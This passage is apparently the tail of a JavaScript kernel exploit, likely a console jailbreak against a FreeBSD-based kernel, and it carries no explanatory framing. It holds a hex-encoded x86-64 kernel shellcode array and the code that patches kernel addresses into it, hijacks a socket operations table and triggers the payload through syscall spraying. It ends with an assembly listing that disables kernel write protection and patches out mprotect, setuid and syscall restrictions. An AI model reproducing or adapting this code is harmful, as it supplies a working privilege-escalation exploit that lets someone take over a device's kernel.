    exec_writer[11] = 0x48F83C8B;
    exec_writer[12] = 0x8B483F8B;
    exec_writer[13] = 0xC748187F;
    exec_writer[14] = 0x00011887;
    exec_writer[15] = 0x00000000;
    exec_writer[16] = 0x3333BF00;
    exec_writer[17] = 0x8B483333;
    exec_writer[18] = 0x8B48F83C;
    exec_writer[19] = 0x7F8B483F;
    exec_writer[20] = 0x87C74818;
    exec_writer[21] = 0x00000118;
    exec_writer[22] = 0x00000000;
    exec_writer[23] = 0x4444BF48;
    exec_writer[24] = 0x44444444;
    exec_writer[25] = 0xBE484444;
    exec_writer[26] = 0x55555555;
    exec_writer[27] = 0x55555555;
    exec_writer[28] = 0x48378948;
    exec_writer[29] = 0x666666BF;
    exec_writer[30] = 0x66666666;
    exec_writer[31] = 0xC0200F66;
    exec_writer[32] = 0xFFFF2548;
    exec_writer[33] = 0x220FFFFE;
    exec_writer[34] = 0xE087C6C0;
    exec_writer[35] = 0xC3007673;
    exec_writer[36] = 0x9090BE48;
    exec_writer[37] = 0x90909090;
    exec_writer[38] = 0x89488B48;
    exec_writer[39] = 0x1A3C08B7;
    exec_writer[40] = 0x7287C700;
    exec_writer[41] = 0xB800054A;
    exec_writer[42] = 0xC7000000;
    exec_writer[43] = 0x00049387;
    exec_writer[44] = 0x00000000;
    exec_writer[45] = 0x87C76600;
    exec_writer[46] = 0x000004B8;
    exec_writer[47] = 0xC7669090;
    exec_writer[48] = 0x0004BC87;
    exec_writer[49] = 0xC6909000;
    exec_writer[50] = 0x0004C587;
    exec_writer[51] = 0x87C6EB00;
    exec_writer[52] = 0x0013D620;
    exec_writer[53] = 0x2387C637;
    exec_writer[54] = 0x370013D6;
    exec_writer[55] = 0x3A87C766;
    exec_writer[56] = 0x9000237F;
    exec_writer[57] = 0x2087C7E9;
    exec_writer[58] = 0x48002B26;
    exec_writer[59] = 0x48C3C031;
    exec_writer[60] = 0xC82087C7;
    exec_writer[61] = 0x00020107;
    exec_writer[62] = 0xC7480000;
    exec_writer[63] = 0x013460C6;
    exec_writer[64] = 0xFE014800;
    exec_writer[65] = 0x28B78948;
    exec_writer[66] = 0x480107C8;
    exec_writer[67] = 0x000000BE;
    exec_writer[68] = 0x00000100;
    exec_writer[69] = 0xB7894800;
    exec_writer[70] = 0x0107C848;
    exec_writer[71] = 0x00000D48;
    exec_writer[72] = 0x220F0001;
    exec_writer[73] = 0x415355C0;
    exec_writer[74] = 0x77BB4854;
    exec_writer[75] = 0x77777777;
    exec_writer[76] = 0x48777777;
    exec_writer[77] = 0x888888BD;
    exec_writer[78] = 0x88888888;
    exec_writer[79] = 0xE4314D88;
    exec_writer[80] = 0x0000C0BF;
    exec_writer[81] = 0xDE894800;
    exec_writer[82] = 0xD5FFD231;
    exec_writer[83] = 0x01C48349;
    exec_writer[84] = 0x00FC8149;
    exec_writer[85] = 0x75000050;
    exec_writer[86] = 0x5B5C41E7;
    exec_writer[87] = 0x80B8485D;
    exec_writer[88] = 0x80808080;
    exec_writer[89] = 0xC3808080;

    p.write4(write_address.add32(0xC), master_socket);
    p.write4(write_address.add32(0x27), overlapped_socket);
    p.write4(write_address.add32(0x42), slave_socket);
  
    p.write8(write_address.add32(0x5E), kevent_file_data.add32(FILE_FOPS_OFFSET));
    p.write8(write_address.add32(0x68), socketops);
    p.write8(write_address.add32(0x75), kernel_base);

    p.write8(write_address.add32(0x12B), kernel_base.add32(KERNEL_M_IP6OPT_OFFSET));
    p.write8(write_address.add32(0x135), kernel_base.add32(KERNEL_MALLOC_OFFSET));
  
    p.write8(fake_socketops.add32(0x18), exec_address);
    chain.syscall(54, kevent_socket, 0x20001111, 0);
    {
        for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
            chain.fcall(syscalls[6], spray_sockets[i]);
        }
    } chain.run();
    p.write8(0,0);
}



/*
    - assemble & take every 4 bytes, byteswap and assign them to exec_writer
    - overwrite dynamic stuff after
*/
  /*
    //get files
    mov rax, [r8 + 0x8]
    mov rax,  [rax + 0x48]
    mov rax, [rax + 0x0]

    //remove master_socket pktopts
    mov edi, 0x11111111
    mov rdi, [rax + 0x8 * rdi]
    mov rdi, [rdi + 0x0]
    mov rdi, [rdi + 0x18]
    mov qword ptr [rdi + 0x118], 0

    //remove overlapped_socket pktopts
    mov edi, 0x22222222
    mov rdi, [rax + 0x8 * rdi]
    mov rdi, [rdi + 0x0]
    mov rdi, [rdi + 0x18]
    mov qword ptr [rdi + 0x118], 0

    //remove slave_socket pktopts
    mov edi, 0x33333333
    mov rdi, [rax + 0x8 * rdi]
    mov rdi, [rdi + 0x0]
    mov rdi, [rdi + 0x18]
    mov qword ptr [rdi + 0x118], 0

    //sockopts ptr field
    mov rdi, 0x4444444444444444
    //original sockopts
    mov rsi, 0x5555555555555555 
    mov qword ptr [rdi], rsi
    //kernel base
    mov rdi, 0x6666666666666666 

    //disable wp
    mov rax, cr0
    and rax, 0xFFFFFFFFFFFEFFFF
    mov cr0, rax

    //crash info
    mov byte ptr [rdi + 0x7673e0], 0xC3

    //mprotect
    mov rsi, 0x8B48909090909090
    mov qword ptr [rdi + 0x1a3c08], rsi

    //setuid
    mov dword ptr [rdi + 0x54a72], 0x000000B8

    //syscall everywhere
    mov dword ptr [rdi + 0x493], 0x00000000
    mov word ptr [rdi + 0x4b8], 0x9090
    mov word ptr [rdi + 0x4bc], 0x9090
    mov byte ptr [rdi + 0x4c5], 0xEB

    //rwx mmap
    mov byte ptr [rdi + 0x13d620], 0x37
    mov byte ptr [rdi + 0x13d623], 0x37

    //dlsym
    mov word ptr [rdi + 0x237f3a], 0xE990
    mov dword ptr [rdi + 0x2B2620], 0xC3C03148

    //syscall 11
    mov qword ptr[rdi + 0x107c820], 0x0000000000000002
    mov rsi, 0x13460
    add rsi, rdi
    mov qword ptr[rdi + 0x107c828], rsi
    mov rsi, 0x0000000100000000
    mov qword ptr[rdi + 0x107c848], rsi

    //enable wp
    or rax, 0x10000
    mov cr0, rax

    //spam malloc
	push rbp
	push rbx
    push r12  

    mov rbx, 0x7777777777777777
	mov rbp, 0x8888888888888888
	xor r12, r12
kmalloc_loop:
	mov edi, 0xC0
    mov rsi, rbx
	xor edx, edx
    call rbp
	add r12, 0x1
    cmp r12, 0x5000
    jne kmalloc_loop
	  
	pop r12
	pop rbx
	pop rbp
	mov rax, 0x8080808080808080
	ret
  */